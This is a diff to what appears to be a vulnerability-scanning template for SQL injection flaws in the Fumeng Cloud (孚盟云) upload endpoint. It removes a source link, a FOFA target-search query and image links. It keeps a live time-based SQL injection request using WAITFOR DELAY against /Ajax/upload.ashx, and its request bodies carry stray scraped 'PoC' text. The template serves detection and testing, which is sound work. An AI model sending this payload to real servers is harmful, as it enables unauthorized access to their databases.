@@ -3,12 +3,8 @@ info:
   name: 孚盟云 upload 存在多处SQL注入漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/rscnhankv34qom8u'
+  description: ''
   tags: sqli,file-upload,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: rscnhankv34qom8u
-    fofa: app="孚盟软件-孚盟云"
 http:
 - raw:
   - 'GET /Ajax/upload.ashx?action=showImgss&FID=1'';WAITFOR+DELAY+''0:0:5''-- HTTP/1.1
@@ -50,8 +46,6 @@ http:
     Connection: keep-alive
 
 
-    ![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1756547081869-06ddd39a-85ac-4777-b7ce-8d2a1bda9b43.png)
-
     PoC-3'
   redirects: false
   matchers:
@@ -74,8 +68,6 @@ http:
     Connection: keep-alive
 
 
-    ![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1756547082174-59c07b0b-4f43-44c8-8ed9-ca8f0c5edf3a.png)
-
     PoC-4'
   redirects: false
   matchers:
@@ -97,8 +89,6 @@ http:
 
     Connection: keep-alive
 
-
-    ![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1756547082473-95789f71-10a5-4c98-8a9c-a583bde55318.png)
 
     PoC-5'
   redirects: false
